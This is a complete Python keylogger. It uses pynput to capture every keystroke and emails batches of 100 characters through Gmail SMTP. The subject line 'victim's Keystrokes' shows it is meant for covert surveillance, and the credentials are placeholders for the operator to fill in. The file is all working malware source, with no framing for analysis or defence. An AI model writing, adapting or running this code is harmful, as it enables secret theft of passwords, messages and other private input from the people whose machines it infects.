from pynput.keyboard import Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

keystrokes = ""

def log_happykey(key):
    global keystrokes
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.shift':
        key = ''
    elif key == 'Key.tab':
        key = ''
    elif key == 'Key.backspace':
        key = '<'

    keystrokes += key

    if len(keystrokes) >= 100:
        send_email_with_content(keystrokes)
        keystrokes = ""  
def send_email_with_content(content):
    from_email = "youremail"
    to_email = "youremail"
    password = "apppassword"

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = "victim's Keystrokes"
    msg.attach(MIMEText(content, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, password)

    server.sendmail(from_email, to_email, msg.as_string())

    server.quit()

with Listener(on_press=log_happykey) as l:
    l.join()
